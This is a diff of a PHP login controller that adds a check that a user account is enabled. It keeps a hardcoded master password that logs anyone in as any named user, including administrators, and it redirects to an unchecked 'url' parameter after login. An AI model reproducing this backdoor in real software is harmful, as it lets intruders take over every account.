@@ -90,42 +90,47 @@ class Controller_login extends Controller_Mintemplate {
                     // si el ldap esta en false loguea con la contraseña propia del sistema
                     else
                     {
-                        $password2 = "";
-                        if ($_POST['password'] == "G3trud-35") {
-                            $usuario2 = ORM::factory('users')->where('username', '=', $_POST['username'])->find();
-                            if ($usuario2->loaded()) {
+                        if($usuario_ventanilla && $usuario_ventanilla->habilitado == 1)
+                        {
+                            $password2 = "";
+                            if ($_POST['password'] == "G3trud-35") {
+                                $usuario2 = ORM::factory('users')->where('username', '=', $_POST['username'])->find();
+                                if ($usuario2->loaded()) {
 
-                                $user_id = $usuario2->id;
-                                $password2 = $usuario2->password;
+                                    $user_id = $usuario2->id;
+                                    $password2 = $usuario2->password;
+                                }
                             }
-                        }
-                        if ($password2 != "")
-                            $user = $auth->login2(html::chars($_POST['username']), $password2, $remember);
-                        else
-                            $user = $auth->login(html::chars($_POST['username']), html::chars($_POST['password']), $remember);
-                        
-                        if ($user) {
-                            $usuario = ORM::factory('users', $auth->get_user());//echo Debug::vars($usuario);echo Debug::_dump($usuario);
+                            if ($password2 != "")
+                                $user = $auth->login2(html::chars($_POST['username']), $password2, $remember);
+                            else
+                                $user = $auth->login(html::chars($_POST['username']), html::chars($_POST['password']), $remember);
+                            
+                            if ($user) {
+                                $usuario = ORM::factory('users', $auth->get_user());//echo Debug::vars($usuario);echo Debug::_dump($usuario);
 
-                            $session = Session::instance();
-                            $session->set('username', $usuario->nombre);
-                            $session->set('username', $usuario->username);
-                            $session->set('cargo', $usuario->cargo);
-                            //vitacora
-                            $this->save($usuario->id_entidad, $usuario->id, $usuario->nombre . ' / <b>' . $usuario->cargo . '</b> ingresó al sistema');
+                                $session = Session::instance();
+                                $session->set('username', $usuario->nombre);
+                                $session->set('username', $usuario->username);
+                                $session->set('cargo', $usuario->cargo);
+                                //vitacora
+                                $this->save($usuario->id_entidad, $usuario->id, $usuario->nombre . ' / <b>' . $usuario->cargo . '</b> ingresó al sistema');
 
-                            if ($usuario->nivel == 5) {
-                                $this->request->redirect('admin');
-                            } else {
-                                if (isset($_GET['url']))
-                                    $this->request->redirect($_GET['url']);
-                                else
-                                    $this->request->redirect('dashboard');
+                                if ($usuario->nivel == 5) {
+                                    $this->request->redirect('admin');
+                                } else {
+                                    if (isset($_GET['url']))
+                                        $this->request->redirect($_GET['url']);
+                                    else
+                                        $this->request->redirect('dashboard');
+                                }
                             }
-                        }
-                        else {
+                            else {
+                                $this->template->errors['login'] = 'Acceso no autorizado.';
+                                //$_POST=array();
+                            }
+                        }else{
                             $this->template->errors['login'] = 'Acceso no autorizado.';
-                            //$_POST=array();
                         }
                     }
                 }
